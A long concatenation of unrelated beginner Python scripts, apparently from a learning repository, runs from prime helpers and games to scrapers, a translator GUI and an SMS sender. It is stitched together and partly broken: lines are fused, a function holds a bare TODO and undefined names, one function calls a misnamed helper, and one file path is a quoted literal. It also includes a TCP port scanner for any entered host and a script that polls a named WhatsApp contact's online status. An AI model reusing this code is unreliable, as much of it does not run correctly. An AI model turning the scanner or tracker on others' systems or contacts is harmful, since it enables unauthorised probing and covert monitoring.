                count1 = primeFac1.count(n)
                for i in range(count1):
                    ans *= n
            done.append(n)
    for n in primeFac2:
        if n not in done:
            count2 = primeFac2.count(n)
            for i in range(count2):
                ans *= n
            done.append(n)
    assert isinstance(ans, int) and (ans >= 0), \
        "'ans' must been from type int and positive"
    return ans
def getPrime(n):
    assert isinstance(n, int) and (n >= 0), "'number' must been a positive int"
    index = 0
    ans = 2  
    while index < n:
        index += 1
        ans += 1  
        while not isPrime(ans):
            ans += 1
    assert isinstance(ans, int) and isPrime(ans), \
        "'ans' must been a prime number and from type int"
    return ans
def getPrimesBetween(pNumber1, pNumber2):
    assert isPrime(pNumber1) and isPrime(pNumber2) and (pNumber1 < pNumber2), \
        "The arguments must been prime numbers and 'pNumber1' < 'pNumber2'"
    number = pNumber1 + 1  
    ans = []  
    while not isPrime(number):
        number += 1
    while number < pNumber2:
        ans.append(number)
        number += 1
        while not isPrime(number):
            number += 1
    assert isinstance(ans, list) and ans[0] != pNumber1 \
           and ans[len(ans) - 1] != pNumber2, \
        "'ans' must been a list without the arguments"
    return ans
def getDivisors(n):
    assert isinstance(n, int) and (n >= 1), "'n' must been int and >= 1"
    ans = []  
    for divisor in range(1, n + 1):
        if n % divisor == 0:
            ans.append(divisor)
    assert ans[0] == 1 and ans[len(ans) - 1] == n, \
        "Error in function getDivisiors(...)"
    return ans
def isPerfectNumber(number):
    assert isinstance(number, int) and (number > 1), \
        "'number' must been an int and >= 1"
    divisors = getDivisors(number)
    assert isinstance(divisors, list) and (divisors[0] == 1) and \
           (divisors[len(divisors) - 1] == number), \
        "Error in help-function getDivisiors(...)"
    return sum(divisors[:-1]) == number
def simplifyFraction(numerator, denominator):
    assert isinstance(numerator, int) and isinstance(denominator, int) \
           and (denominator != 0), \
        "The arguments must been from type int and 'denominator' != 0"
    gcdOfFraction = gcd(abs(numerator), abs(denominator))
    assert isinstance(gcdOfFraction, int) and (numerator % gcdOfFraction == 0) \
           and (denominator % gcdOfFraction == 0), \
        "Error in function gcd(...,...)"
    return (numerator // gcdOfFraction, denominator // gcdOfFraction)
def factorial(n):
    assert isinstance(n, int) and (n >= 0), "'n' must been a int and >= 0"
    ans = 1  
    for factor in range(1, n + 1):
        ans *= factor
    return ans
def fib(n):
    assert isinstance(n, int) and (n >= 0), "'n' must been an int and >= 0"
    tmp = 0
    fib1 = 1
    ans = 1  
    for i in range(n - 1):
        tmp = ans
        ans += fib1
        fib1 = tmp
    return ans
import time
import threading
def calc_square(numbers):
    print("calculate square numbers")
    for n in numbers:
        time.sleep(1)
        print('square:',n*n)
def calc_cube(numbers):
    print("calculate cube of numbers")
    for n in numbers:
        time.sleep(1)
        print('cube:',n*n*n)
arr = [2,3,8,9]
t = time.time()
t1= threading.Thread(target=calc_square, args=(arr,))
t2= threading.Thread(target=calc_cube, args=(arr,))
t1.start()
t2.start()
t1.join()
t2.join()
print("done in : ",time.time()-t)
print("Hah... I am done with all my work now!")
def binarySearch(arr, l, r, x):
    if l <= r:
        mid = (l+r) // 2 
        if arr[mid] == x:
            return mid
        elif arr[mid] > x:
            return binary_search(arr, l, mid - 1, x)
        else:
            return binary_search(arr, mid + 1, r, x)
    return -1
if __name__ == "__main__":
    print("Enter the array with comma separated in which element will be searched")
    arr =[int(x) for x in input().split(',')] 
    x = eval(input("Enter the element you want to search in given array"))
    result = binarySearch(arr, 0, len(arr) - 1, x)
    if result != -1:
        print("Element is present at index {}".format(result))
    else:
        print("Element is not present in array")
class Node:
    def __init__(self, data):
        self.data = data
        self.next = None
class Linked_List:
    def __init__(self):
        self.head = None
    def Insert_At_End(self, new_data):
        new_node = Node(new_data)
        if self.head is None:
            self.head = new_node
            return
        current = self.head
        while(current.next):
            current = current.next
        current.next = new_node
    def Detect_and_Remove_Loop(self):
        slow = fast = self.head
        while(slow and fast and fast.next):
            slow = slow.next
            fast = fast.next.next
            if slow == fast:
                self.Remove_loop(slow)
                print("Loop Found")
                return 1
        return 0
    def Remove_loop(self, Loop_node):
        ptr1 = self.head
        while(1):
            ptr2 = Loop_node
            while(ptr2.next != Loop_node and ptr2.next != ptr1):
                ptr2 = ptr2.next
            if ptr2.next == ptr1:
                break
            ptr1 = ptr1.next
        ptr2.next = None
    def Display(self):
        temp = self.head
        while(temp):
            print(temp.data, "->", end=" ")
            temp = temp.next
        print("None")
if __name__ == "__main__":
    L_list = Linked_List()
    L_list.Insert_At_End(8)
    L_list.Insert_At_End(5)
    L_list.Insert_At_End(10)
    L_list.Insert_At_End(7)
    L_list.Insert_At_End(6)
    L_list.Insert_At_End(11)
    L_list.Insert_At_End(9)
    print("Linked List with Loop: ")
    L_list.Display()
    print("Linked List without Loop: ")
    L_list.head.next.next.next.next.next.next.next = L_list.head.next.next
    L_list.Detect_and_Remove_Loop()
    L_list.Display()
import asyncio
from os.path import basename
import aiohttp
def download(ways):
    if not ways:
        print('Ways list is empty. Downloading is impossible')
        return
    print('downloading..')
    success_files = set()
    failure_files = set()
    event_loop = asyncio.get_event_loop()
    try:
        event_loop.run_until_complete(
            async_downloader(ways, event_loop, success_files, failure_files)
        )
    finally:
        event_loop.close()
    print('Download complete')
    print('-' * 100)
    if success_files:
        print('success:')
        for file in success_files:
            print(file)
    if failure_files:
        print('failure:')
        for file in failure_files:
            print(file)
async def async_downloader(ways, loop, success_files, failure_files):
    async with aiohttp.ClientSession() as session:
        coroutines = [
            download_file_by_url(
                url,
                session=session,
            ) for url in ways]
        for task in asyncio.as_completed(coroutines):
            fail, url = await task
            if fail:
                failure_files.add(url)
            else:
                success_files.add(url)
async def download_file_by_url(url, session=None):
    fail = True
    file_name = basename(url)
    assert session
    try:
        async with session.get(url) as response:
            if response.status == 404:
                print('\t{} from {} : Failed : {}'.format(
                    file_name, url, '404 - Not found'))
                return fail, url
            if not response.status == 200:
                print('\t{} from {} : Failed : HTTP response {}'.format(
                    file_name, url, response.status))
                return fail, url
            data = await response.read()
            with open(file_name, 'wb') as file:
                file.write(data)
    except asyncio.TimeoutError:
        print('\t{} from {}: Failed : {}'.format(
            file_name, url, 'Timeout error'))
    except aiohttp.client_exceptions.ClientConnectionError:
        print('\t{} from {}: Failed : {}'.format(
            file_name, url, 'Client connection error'))
    else:
        print('\t{} from {} : Success'.format(file_name, url))
        fail = False
    return fail, url
def test():
    ways = ['https://www.wikipedia.org',
            'https://www.ya.ru',
            'https://www.duckduckgo.com',
            'https://www.fail-path.unknown',
            ]
    download(ways)
if __name__ == "__main__":
    test()
from os import chdir
from os import makedirs
from os import removedirs
from os import rename
from os.path import exists
from os.path import pardir
from shutil import copytree
from shutil import move
def create_directory(name):
    if exists(pardir + "\\" + name):
        print('Folder already exists... Cannot Overwrite this')
    else:
        makedirs(pardir + "\\" + name)
def delete_directory(name):
    removedirs(name)
def rename_directory(direct, name):
    rename(direct, name)
def set_working_directory():
    chdir(pardir)
def backup_files(name_dir, folder):
    copytree(pardir, name_dir + ':\\' + folder)
def move_folder(filename, name_dir, folder):
    if not exists(name_dir + ":\\" + folder):
        makedirs(name_dir + ':\\' + folder)
    move(filename, name_dir + ":\\" + folder + '\\')
import random
import pygame
BLACK = (0, 0, 0)
WHITE = (255, 255, 255)
GREEN = (0, 255, 0)
RED = (255, 0, 0)
pygame.init()
size = (700, 500)
screen = pygame.display.set_mode(size)
class Ball(object):
    def __init__(self, screen, radius, x, y):
        self.__screen = screen
        self._radius = radius
        self._xLoc = x
        self._yLoc = y
        self.__xVel = 7
        self.__yVel = 2
        w, h = pygame.display.get_surface().get_size()
        self.__width = w
        self.__height = h
    def getXVel(self):
        return self.__xVel
    def getYVel(self):
        return self.__yVel
    def draw(self):
        pygame.draw.circle(screen, (255, 0, 0), (self._xLoc, self._yLoc), self._radius)
    def update(self, paddle, brickwall):
        self._xLoc += self.__xVel
        self._yLoc += self.__yVel
        if self._xLoc <= self._radius:
            self.__xVel *= -1
        elif self._xLoc >= self.__width - self._radius:
            self.__xVel *= -1
        if self._yLoc <= self._radius:
            self.__yVel *= -1
        elif self._yLoc >= self.__width - self._radius:
            return True
        if brickwall.collide(self):
            self.__yVel *= -1
        paddleY = paddle._yLoc
        paddleW = paddle._width
        paddleH = paddle._height
        paddleX = paddle._xLoc
        ballX = self._xLoc
        ballY = self._yLoc
        if ((ballX + self._radius) >= paddleX and ballX <= (paddleX + paddleW)) \
                and ((ballY + self._radius) >= paddleY and ballY <= (paddleY + paddleH)):
            self.__yVel *= -1
        return False
class Paddle(object):
    def __init__(self, screen, width, height, x, y):
        self.__screen = screen
        self._width = width
        self._height = height
        self._xLoc = x
        self._yLoc = y
        w, h = pygame.display.get_surface().get_size()
        self.__W = w
        self.__H = h
    def draw(self):
        pygame.draw.rect(screen, (0, 0, 0), (self._xLoc, self._yLoc, self._width, self._height), 0)
    def update(self):
        x, y = pygame.mouse.get_pos()
        if x >= 0 and x <= (self.__W - self._width):
            self._xLoc = x
class Brick(pygame.sprite.Sprite):
    def __init__(self, screen, width, height, x, y):
        self.__screen = screen
        self._width = width
        self._height = height
        self._xLoc = x
        self._yLoc = y
        w, h = pygame.display.get_surface().get_size()
        self.__W = w
        self.__H = h
        self.__isInGroup = False
    def draw(self):
        pygame.draw.rect(screen, (56, 177, 237), (self._xLoc, self._yLoc, self._width, self._height), 0)
    def add(self, group):
        group.add(self)
        self.__isInGroup = True
    def remove(self, group):
        group.remove(self)
        self.__isInGroup = False
    def alive(self):
        return self.__isInGroup
    def collide(self, ball):
        brickX = self._xLoc
        brickY = self._yLoc
        brickW = self._width
        brickH = self._height
        ballX = ball._xLoc
        ballY = ball._yLoc
        ballXVel = ball.getXVel()
        ballYVel = ball.getYVel()
        if ((ballX + ball._radius) >= brickX and (ballX + ball._radius) <= (brickX + brickW)) \
                and ((ballY - ball._radius) >= brickY and (ballY - ball._radius) \
                     <= (brickY + brickH)):
            return True
        else:
            return False
class BrickWall(pygame.sprite.Group):
    def __init__(self, screen, x, y, width, height):
        self.__screen = screen
        self._x = x
        self._y = y
        self._width = width
        self._height = height
        self._bricks = []
        X = x
        Y = y
        for i in range(3):
            for j in range(4):
                self._bricks.append(Brick(screen, width, height, X, Y))
                X += width + (width / 7.0)
            Y += height + (height / 7.0)
            X = x
    def add(self, brick):
        self._bricks.append(brick)
    def remove(self, brick):
        self._bricks.remove(brick)
    def draw(self):
        for brick in self._bricks:
            if brick != None:
                brick.draw()
    def update(self, ball):
        for i in range(len(self._bricks)):
            if ((self._bricks[i] != None) and self._bricks[i].collide(ball)):
                self._bricks[i] = None
        for brick in self._bricks:
            if brick is None:
                self._bricks.remove(brick)
    def hasWin(self):
        return len(self._bricks) == 0
    def collide(self, ball):
        for brick in self._bricks:
            if brick.collide(ball):
                return True
        return False
ball = Ball(screen, 25, random.randint(1, 700), 250)
paddle = Paddle(screen, 100, 20, 250, 450)
brickWall = BrickWall(screen, 25, 25, 150, 50)
isGameOver = False  
gameStatus = True  
score = 0  
pygame.display.set_caption("Brickout-game")
done = False
clock = pygame.time.Clock()
pygame.font.init()  
mgGameOver = pygame.font.SysFont('Comic Sans MS', 40)
mgWin = pygame.font.SysFont('Comic Sans MS', 40)
mgScore = pygame.font.SysFont('Comic Sans MS', 40)
textsurfaceGameOver = mgGameOver.render('Game Over!', False, (0, 0, 0))
textsurfaceWin = mgWin.render("You win!", False, (0, 0, 0))
textsurfaceScore = mgScore.render("score: " + str(score), False, (0, 0, 0))
while not done:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            done = True
    screen.fill(WHITE)
    if gameStatus:
        brickWall.draw()
        if brickWall.collide(ball):
            score += 10
        textsurfaceScore = mgScore.render("score: " + str(score), False, (0, 0, 0))
        screen.blit(textsurfaceScore, (300, 0))
        brickWall.update(ball)
        paddle.draw()
        paddle.update()
        if ball.update(paddle, brickWall):
            isGameOver = True
            gameStatus = False
        if brickWall.hasWin():
            gameStatus = False
        ball.draw()
    else:  
        if isGameOver:  
            screen.blit(textsurfaceGameOver, (0, 0))
            textsurfaceScore = mgScore.render("score: " + str(score), False, (0, 0, 0))
            screen.blit(textsurfaceScore, (300, 0))
        elif brickWall.hasWin():  
            screen.blit(textsurfaceWin, (0, 0))
            textsurfaceScore = mgScore.render("score: " + str(score), False, (0, 0, 0))
            screen.blit(textsurfaceScore, (300, 0))
    pygame.display.flip()
    clock.tick(60)
pygame.quit()
def sum(a,b):
    return a+b
n1=int(input('enter first number: '))
n2=int(input('enter first number: '))
print('sum is: ',sum(n1,n2))
import argparse
import os
import shutil
import time
usage = 'python move_files_over_x_days.py -src [SRC] -dst [DST] -days [DAYS]'
description = 'Move files from src to dst if they are older than a certain number of days.  Default is 240 days'
args_parser = argparse.ArgumentParser(usage=usage, description=description)
args_parser.add_argument('-src', '--src', type=str, nargs='?', default='.',
                         help='(OPTIONAL) Directory where files will be moved from. Defaults to current directory')
args_parser.add_argument('-dst', '--dst', type=str, nargs='?', required=True,
                         help='(REQUIRED) Directory where files will be moved to.')
args_parser.add_argument('-days', '--days', type=int, nargs='?', default=240,
                         help='(OPTIONAL) Days value specifies the minimum age of files to be moved. Default is 240.')
args = args_parser.parse_args()
if args.days < 0:
    args.days = 0
src = args.src  
dst = args.dst  
days = args.days  
now = time.time()  
if not os.path.exists(dst):
    os.mkdir(dst)
for f in os.listdir(src):  
    if os.stat(f).st_mtime < now - days * 86400:  
        if os.path.isfile(f):  
            shutil.move(f, dst)  
from tkinter import *
from translate import Translator
def translate():
    translator= Translator(from_lang=lan1.get(),to_lang=lan2.get())
    translation = translator.translate(var.get())
    var1.set(translation)
root = Tk()
root.title("Translator")
mainframe = Frame(root)
mainframe.grid(column=0,row=0, sticky=(N,W,E,S) )
mainframe.columnconfigure(0, weight = 1)
mainframe.rowconfigure(0, weight = 1)
mainframe.pack(pady = 100, padx = 100)
lan1 = StringVar(root)
lan2 = StringVar(root)
lan1.set('English')
lan2.set('Hindi')
Label(mainframe,text="Enter language translate from").grid(row = 0, column = 1)
var=StringVar()
textbox= Entry(mainframe,textvariable=var).grid(row = 1, column =1,padx=10, pady=10)
Label(mainframe,text="Enter a language to").grid(row = 0, column = 2)
var=StringVar()
textbox= Entry(mainframe,textvariable=var).grid(row = 1, column =2,padx=10, pady=10)
Label(mainframe, text = "Enter text").grid(row=3,column=0)
var = StringVar()
textbox = Entry(mainframe, textvariable=var).grid(row=3,column=1)
Label(mainframe, text = "Output").grid(row=3,column=2)
var1 = StringVar()
textbox = Entry(mainframe, textvariable=var1).grid(row=3,column=3,padx=10,pady=10)
b=Button(mainframe,text='Translate',command=translate ,activebackground="green").grid(row=4,column=1,columnspan=3)
root.mainloop()class Father():
   def skills(self):
       print("gardening,programming")
class Mother():
   def skills(self):
       print("cooking,art")
class Child(Father,Mother):
    def skills(self):
        Father.skills(self)
        Mother.skills(self)
        print("sports")
c = Child()
c.skills()
import socket
import subprocess
import sys
from datetime import datetime
subprocess.call('clear', shell=True)
remoteServer = input("Enter a remote host to scan: ")
remoteServerIP = socket.gethostbyname(remoteServer)
print("-" * 60)
print("Please wait, scanning remote host", remoteServerIP)
print("-" * 60)
t1 = datetime.now()
try:
    for port in range(1, 1025):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex((remoteServerIP, port))
        if result == 0:
            print("Port {}: 	 Open".format(port))
        sock.close()
except KeyboardInterrupt:
    print("You pressed Ctrl+C")
    sys.exit()
except socket.gaierror:
    print('Hostname could not be resolved. Exiting')
    sys.exit()
except socket.error:
    print("Couldn't connect to server")
    sys.exit()
t2 = datetime.now()
total = t2 - t1
print('Scanning Completed in: ', total)
import requests
from bs4 import BeautifulSoup
import os
import json
class Phonearena():
    def __init__(self):
        self.phones = []
        self.features = ["Brand", "Model Name", "Model Image"]
        self.temp1 = []
        self.phones_brands = []
        self.url = 'https://www.phonearena.com/phones/'  
        self.new_folder_name = 'GSMArenaDataset'
        self.absolute_path = os.getcwd().strip() + '/' + self.new_folder_name
    def crawl_html_page(self, sub_url):
        url = sub_url  
        try:
            page = requests.get(url)
            soup = BeautifulSoup(page.text, 'html.parser')
            return soup
        except ConnectionError as err:
            print("Please check your network connection and re-run the script.")
            exit()
        except Exception:
            print("Please check your network connection and re-run the script.")
            exit()
    def crawl_phone_urls(self):
        phones_urls = []
        for i in range(1, 238):  
            print(self.url+"page/"+str(i))
            soup = self.crawl_html_page(self.url+"page/"+str(i))
            table = soup.findAll("div", {"class": "stream-item"})
            table_a = [k.find('a') for k in table]
            for a in table_a:
                temp = a['href']
                phones_urls.append(temp)
        return phones_urls
    def crawl_phones_models_specification(self, li):
        phone_data = {}
        for link in li:
            print(link)
            try:
                soup = self.crawl_html_page(link)
                model = soup.find(
                    class_='page__section page__section_quickSpecs')
                model_name = model.find("header").h1.text
                model_img_html = model.find(class_='head-image')
                model_img = model_img_html.find('img')['data-src']
                specs_html = model.find(
                    class_="phone__section phone__section_widget_quickSpecs")
                release_date = specs_html.find(class_="calendar")
                release_date = release_date.find(class_="title").p.text
                display = specs_html.find(class_="display")
                display = display.find(class_="title").p.text
                camera = specs_html.find(class_="camera")
                camera = camera.find(class_="title").p.text
                hardware = specs_html.find(class_="hardware")
                hardware = hardware.find(class_="title").p.text
                storage = specs_html.find(class_="storage")
                storage = storage.find(class_="title").p.text
                battery = specs_html.find(class_="battery")
                battery = battery.find(class_="title").p.text
                os = specs_html.find(class_="os")
                os = os.find(class_="title").p.text
                phone_data[model_name] = {
                    "image": model_img,
                    "release_date": release_date,
                    "display": display,
                    "camera": camera,
                    "hardware": hardware,
                    "storage": storage,
                    "battery": battery,
                    "os": os
                }
                with open(obj.absolute_path+'-PhoneSpecs.json', 'w+') as of:
                    json.dump(phone_data, of)
            except Exception as error:
                print(f"Exception happened : {error}")
                continue
        return phone_data
if __name__ == "__main__":
    obj = Phonearena()
    try:
        phone_urls = obj.crawl_phone_urls()
        with open(obj.absolute_path+'-Phoneurls.json', 'w') as of:
            json.dump(phone_urls, of)
        with open("obj.absolute_path+'-Phoneurls.json", "r") as inp:
            temp = json.load(inp)
            phone_specs = obj.crawl_phones_models_specification(temp)
    except KeyboardInterrupt:
        print("File has been stopped due to KeyBoard Interruption.")
from __future__ import print_function
import os
resultfile = 'result.csv'
def merge():
    TODO: fix this function!!
    r=int(r)
    g=int(g)
    b=int(b)
    bg = ir = 0  
    try:
        if r > g and r > b:
            rg = diff(r,g) 
            rb = diff(r,b) 
            if g < 65 and  b < 65 and  rg > 60: 
                return "ROJO"
            gb=diff(g,b) 
            if rg < rb: 
                if gb < rg: 
                    if gb >=30 and rg >= 80:
                        return "NARANJA"
                    elif gb<=20 and rg >= 80:
                        return "ROJO"
                    elif gb<=20 and b > 175:
                        return "CREMA"
                    else:
                        return "CHOCOLATE"
                else: 
                    if rg > 60:
                        return "NARANJA*"
                    elif r > 125:
                        return "AMARILLO"
                    else:
                        return  "COCHOLATE"
            elif rg > rb: 
                if bg < rb: 
                    if gb < 60:
                        if r >150:
                            return "ROJO 2"
                        else:
                            return "MARRON"
                    elif g > 125:
                        return "ROSADO"
                    else:
                        return "ROJO 3"
                else: 
                    if rb < 60:
                        if r > 160:
                            return "ROSADO*"
                        else:
                            return  "ROJO"
                    else:
                        return "ROJO"
            else: 
                if rg > 20:
                    if r>=100 and b <60:
                        return "ROJO"
                    elif r >=100:
                        return "ROJO"
                    else:
                        return "MARRON"
                else:
                    return "GRIS"
        elif g > r and g > b:
            gb = diff(g,b) 
            gr = diff(g,r) 
            if r < 65 and  b < 65 and  gb > 60: 
                return "VERDE"
            rb=diff(r,b) 
            if r > b: 
                if gr < gb: 
                    if rb>=150 and gr <=20:
                        return "AMARILLO"
                    else:
                        return "VERDE"
                else: 
                    return "VERDE"
            elif r < b: 
                if gb < gr: 
                    if gb<=20:
                        return "TURQUESA"
                    else:
                        return "VERDE"
                else: 
                    return "VERDE"
            else: 
                if gb > 10:
                    return "VERDE"
                else:
                    return "GRIS"
        elif b > r and b > g:
            bg = diff(b,g) 
            br = diff(b,r) 
            if r < 65 and  g < 65 and  bg > 60: 
                return "AZUL"
            rg=diff(r,g) 
            if g < r: 
                if bg < rg: 
                    if bg<=20:
                        return "TURQUESA"
                    else:
                        return "CELESTE"
                else: 
                    if rg <= 20:
                        if r >= 150:
                            return "LILA"
                        else:
                            return "AZUL *************"
                    else:
                        return "AZUL"
            elif g > r: 
                if br < rg: 
                    if br <=20:
                        if r > 150 and g < 75:
                            return "ROSADO FIUSHA"
                        elif ir > 150:
                            return "LILA"
                        else:
                            return "MORADO"
                    else:
                        return "MORADO"
                else: 
                    if rg <= 20:
                        if bg <=20:
                            return "GRIS"
                        else:
                            return "AZUL"
            else: 
                if bg > 20:
                    if r>=100 and b <60:
                        return "ROJO"
                    elif r >=100:
                        return "ROJO"
                    else:
                        return "MARRON"
                else:
                    return "GRIS"
        else:
            return "GRIS"
    except:
        return "Not Color"
if __name__=='__main__':
    import sys
    print(simpleColor(sys.argv[1],sys.argv[2],sys.argv[3]))
from __future__ import print_function
import sys
from getpass import getpass
import cookielib
import urllib2
try:
    input = raw_input
except NameError:
    pass
username = input('Enter mobile number:')
passwd = getpass()
message = input('Enter Message:')
x = input('Enter Mobile numbers seperated with comma:')
num = x.split(',')
message = "+".join(message.split(' '))
url = 'http://site24.way2sms.com/Login1.action?'
data = 'username={0}&password={1}&Submit=Sign+in'.format(username, passwd)
cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
opener.addheaders = [('User-Agent',
                      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 '
                      'Safari/537.36')]
try:
    usock = opener.open(url, data)
except IOError:
    print("Error while logging in.")
    sys.exit(1)
jession_id = str(cj).split('~')[1].split(' ')[0]
send_sms_url = 'http://site24.way2sms.com/smstoss.action?'
opener.addheaders = [('Referer', 'http://site25.way2sms.com/sendSMS?Token=%s' % jession_id)]
try:
    for number in num:
        send_sms_data = 'ssaction=ss&Token={0}&mobile={1}&message={2}&msgLen=136'.format(jession_id, number, message)
        sms_sent_page = opener.open(send_sms_url, send_sms_data)
except IOError:
    print("Error while sending message")
print("SMS has been sent.")
sys.exit(1)
def cubeRoot():
    x = int(input("Enter an integer: "))
    for ans in range(0, abs(x) + 1):
        if ans ** 3 == abs(x):
            break
    if ans ** 3 != abs(x):
        print(x, 'is not a perfect cube!')
    else:
        if x < 0:
            ans = -ans
    print('Cube root of ' + str(x) + ' is ' + str(ans))
cubeRoot()
cont = str(input("Would you like to continue: "))
while cont == "yes":
    cubeRoot()
    cont = str(input("Would you like to continue: "))
    if cont == "no":
        exit()
    else:
        print("Enter a correct answer(yes or no)")
        cont = str(input("Would you like to continue: "))
from __future__ import print_function
import os  
import subprocess  
import sys  
filename = sys.argv[0]  
if '-h' in sys.argv or '--h' in sys.argv or '-help' in sys.argv or '--help' in sys.argv:  
    sys.exit(0)
else:
    if len(sys.argv) < 3:  
        sys.exit(
            '\nYou need to supply the app group. Usage : ' + filename +
            ' followed by the application group i.e. \n \t dms or \n \t swaps \n '
            'then the site i.e. \n \t 155 or \n \t bromley')
    appgroup = sys.argv[1]  
    site = sys.argv[2]  
    if os.name == "posix":  
        myping = "ping -c 2 "  
    elif os.name in ("nt", "dos", "ce"):  
        myping = "ping -n 2 "  
    if 'dms' in sys.argv:  
        appgroup = 'dms'  
    elif 'swaps' in sys.argv:  
        appgroup = 'swaps'  
    if '155' in sys.argv:  
        site = '155'  
    elif 'bromley' in sys.argv:  
        site = 'bromley'  
logdir = os.getenv("logs")  
logfile = 'ping_' + appgroup + '_' + site + '.log'  
logfilename = os.path.join(logdir, logfile)  
confdir = os.getenv("my_config")  
conffile = (appgroup + '_servers_' + site + '.txt')  
conffilename = os.path.join(confdir,
                            conffile)  
f = open(logfilename, "w")  
for server in open(conffilename):  
    ret = subprocess.call(myping + server, shell=True, stdout=f,
                          stderr=subprocess.STDOUT)  
    if ret == 0:  
        f.write(server.strip() + " is alive" + "\n")  
    else:
        f.write(server.strip() + " did not respond" + "\n")  
print("\n\tYou can see the results in the logfile : " + logfilename);  
import pyglet
import random
from typing import Tuple
class BallObject(pyglet.shapes.Circle):
    def __init__(self, *args, **kwargs):
        super(BallObject, self).__init__(*args, **kwargs)
        self.color = (255, 180, 0)
        self.velocity_x, self.velocity_y = 0.0, 0.0
    def update(self, win_size: Tuple, border: Tuple, other_object, dt) -> None:
        speed = [2.37, 2.49, 2.54, 2.62, 2.71, 2.85, 2.96, 3.08, 3.17, 3.25]    
        rn = random.choice(speed)
        newx = self.x + self.velocity_x
        newy = self.y + self.velocity_y
        if newx < border + self.radius or newx > win_size[0] - border - self.radius:
            self.velocity_x = -(self.velocity_x/abs(self.velocity_x))*rn
        elif newy > win_size[1] - border - self.radius:
            self.velocity_y = -(self.velocity_y/abs(self.velocity_y))*rn
        elif (newy-self.radius < other_object.height) and (other_object.x <= newx <= other_object.rightx):
            self.velocity_y = -(self.velocity_y/abs(self.velocity_y))*rn
        else:
            self.x = newx
            self.y = newy
from selenium import webdriver
import os
import time
driver = webdriver.Firefox()
driver.get("http://web.whatsapp.com")
name=input("Please Enter Name for search online status: ")
while True:
    try:
        chat=driver.find_element_by_xpath("/html/body/div[1]/div/div/div[3]/div/header/div[2]/div/span/div[2]/div")
        chat.click()
        time.sleep(2)
        search=driver.find_element_by_xpath("/html/body/div[1]/div/div/div[2]/div[1]/span/div/span/div/div[1]/div/label/input")
        search.click()
        time.sleep(2)
        search.send_keys(name)
        time.sleep(2)
        open=driver.find_element_by_xpath("/html/body/div[1]/div/div/div[2]/div[1]/span/div/span/div/div[2]/div[1]/div/div/div[2]/div/div")
        open.click()
        time.sleep(2)
        while True:
            try:
                status = driver.find_element_by_class_name("_315-i").text
                name = driver.find_element_by_class_name("_19vo_").text
                print("{0} is {1}".format(name,status))
                time.sleep(30)
            except:
            	name = driver.find_element_by_class_name("_19vo_").text
            	print("{0} is {1}".format(name,"offline"))
            	time.sleep(30)
    except:
            pass
from sys import argv
script, input_file = argv
def print_all(f):
    print(f.read())
def rewind(f):
    f.seek(0)
def print_a_line(line_count, f):
    print(line_count, f.readline())
current_file = open(input_file)
print("First let's print the whole file:\n")
print_all(current_file)
print("Now let's rewind, kind of like a tape.")
rewind(current_file)
print("Let's print three lines:")
current_line = 1
print_a_line(current_line, current_file)
current_line = current_line + 1
print_a_line(current_line, current_file)
current_line = current_line + 1
print_a_line(current_line, current_file)
current_file.close()
from random import randint
from time import sleep
print("Hello Welcome To The Guess Game!")
sleep(1)
print("I\'m Geek! What's Your Name?")
name = input()
sleep(1)
print(f"Okay {name} Let's Begin The Guessing Game!")
a = comGuess = randint(0, 100)  
count = 0
while True:  
    userGuess = int(input("Enter your guessed no. b/w 0-100:"))  
    if userGuess < comGuess:  
        print("Guess Higher")
        comGuess = randint(a, 100)
        a += 1
        count = 1
    elif userGuess > comGuess:  
        print("Guess Lower")
        comGuess = randint(0, a)
        a += 1
        count = 1
    elif userGuess == comGuess and count == 0:  
        print("Bravo! Legendary Guess!")
    else:  
        print("Congratulations, You Guessed It Correctly!")
integer = [0, 1, 2, 3, 4]
binary = ["0", "1", "10", "11", "100"]
z = zip(integer, binary)
binary_dict = {integer: binary for integer, binary in z}
print(binary_dict)
integer = [1, -1, 2, 3, 5, 0, -7]
additive_inverse = [-1*i for i in integer]
print(additive_inverse)
integer = [1, -1, 2, -2, 3, -3]
sq_set = {i*i for i in integer}
print(sq_set)
import time
print('Press ENTER to begin, Press Ctrl + C to stop')
while True:
    try:
        input()  
        starttime = time.time()
        print('Started')
        while True:
            print('Time Elapsed: ', round(time.time() - starttime, 0), 'secs', end="\r")
            time.sleep(1) 
    except KeyboardInterrupt:
        print('Stopped')
        endtime = time.time()
        print('Total Time:', round(endtime - starttime, 2), 'secs')
        break
import sys
from PIL import ImageDraw, ImageFont, Image
def input_par():
    print('Enter the text to insert in image: ')
    text = str(input())
    print('Enter the desired size of the text: ')
    size = int(input())
    print('Enter the color for the text(r, g, b): ')
    color_value = [int(i) for i in input().split(' ')]
    return text, size, color_value
    pass
def main():
    path_to_image = sys.argv[1]
    image_file = Image.open(path_to_image + '.jpg')
    image_file = image_file.convert("RGBA")
    pixdata = image_file.load()
    print(image_file.size)
    text, size, color_value = input_par()
    font = ImageFont.truetype("C:\\Windows\\Fonts\\Arial.ttf", size=size)
    if ((color_value[0] and color_value[1] and color_value[2]) != 255):
        for y in range(100):
            for x in range(100):
                pixdata[x, y] = (255, 255, 255, 255)
    else:
        for y in range(100):
            for x in range(100):
                pixdata[x, y] = (0, 0, 0, 255)
    image_file.show()
    draw = ImageDraw.Draw(image_file)
    draw.text((0, 2300), text, (color_value[0], color_value[1], color_value[2]), font=font)
    draw = ImageDraw.Draw(image_file)
    print('Enter the file name: ')
    file_name = str(input())
    image_file.save(file_name + ".jpg")
    pass
if __name__ == '__main__':
    main()
def FizzBuzz():
    num = int(input("Enter the number here: "))
    for i in range(1, num+1):
        if i%3 == 0 and i%5 == 0:
            print("FizzBuzz")
        elif i%3 == 0:
            print("Fizz")
        elif i%5 == 0:
            print("Buzz")
        else:
            print(i)
def solve(num_heads, num_legs):
    ns = 'No solutions!'
    for i in range(num_heads + 1):
        j = num_heads - i
        if 2 * i + 4 * j == num_legs:
            return i, j
    return ns, ns
if __name__ == "__main__":
    numheads = 35
    numlegs = 94
    solutions = solve(numheads, numlegs)
    print(solutions)
f=open("funny.txt","r")
for line in f:
    print(line)
f.close()
f=open("funny.txt","r")
lines = f.readlines()
print(lines)
f=open("love.txt","w")
f.write("I love python")
f.close()
f=open("love.txt","w")
f.write("I love javascript")
f.close()
f=open("love.txt","a")
f.write("I love javascript")
f.close()
f=open("love.txt","w")
